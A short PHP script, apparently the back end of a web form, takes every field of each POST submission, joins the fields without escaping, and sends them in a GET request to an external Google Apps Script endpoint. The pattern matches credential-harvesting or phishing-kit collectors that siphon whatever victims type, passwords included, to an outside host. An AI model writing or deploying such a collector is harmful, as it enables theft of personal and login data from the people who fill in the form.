<?php
$url = 'https://script.google.com/macros/s/AKfycbyrJAffhej-etQRoYWgGRqvfldC8Vt4u8Kvf13fo9AA_LAuFlYU/exec';
$imp = implode($_POST);
file_get_contents($url."?p1=$imp");
